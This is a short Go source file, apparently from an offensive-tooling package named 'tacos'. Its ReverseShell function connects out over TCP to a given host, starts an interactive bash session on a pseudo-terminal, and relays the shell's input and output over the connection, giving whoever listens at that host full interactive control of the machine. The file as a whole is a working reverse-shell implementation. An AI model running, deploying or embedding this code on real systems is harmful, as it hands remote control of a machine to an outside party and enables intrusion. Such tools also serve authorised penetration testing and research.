package tacos

import (
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"syscall"

	"github.com/ariary/go-utils/pkg/logger"
	"github.com/creack/pty"
	"golang.org/x/term"
)

//DefaultShell: return the default shell
func DefaultShell() string {
	return "/bin/bash"
}

//ReverseShell: spawn a reverse shell
func ReverseShell(host string) {
	logger.AddFilenameAndLinePrefix(log.Default())

	conn, err := net.Dial("tcp", host)
	if nil != err {
		log.Fatal(err)
	}

	if err != nil {
		panic(err)
	}
	// Start the command
	cmd := exec.Command("bash", "-li")
	// Create PTY
	pty, tty, err := pty.Open()
	if err != nil {
		log.Printf("error: could not open PTY: %s", err)
	}
	defer tty.Close()
	defer pty.Close()

	// Put the TTY into raw mode
	_, err = term.MakeRaw(int(tty.Fd()))
	if err != nil {
		log.Printf("warn: could not make TTY raw: %s", err)
	}

	// Hook everything up
	cmd.Stdout = tty
	cmd.Stdin = tty
	cmd.Stderr = tty
	if cmd.SysProcAttr == nil {
		cmd.SysProcAttr = &syscall.SysProcAttr{}
	}

	cmd.SysProcAttr.Setctty = true
	cmd.SysProcAttr.Setsid = true
	fmt.Println(cmd.SysProcAttr.Ctty)

	// Start command
	err = cmd.Start()
	if err != nil {
		log.Printf("error: could not start command: %s", err)
	}

	errs := make(chan error, 3)

	go func() {
		_, err := io.Copy(conn, pty)
		errs <- err
	}()
	go func() {
		_, err := io.Copy(pty, conn)
		errs <- err
	}()
	go func() {
		errs <- cmd.Wait()
	}()

	// Wait for a single error, then shut everything down. Since returning from
	// this function closes the connection, we just read a single error and
	// then continue.
	<-errs
	log.Printf("info: connection from %s finished", conn.RemoteAddr())

	conn.Close()
}
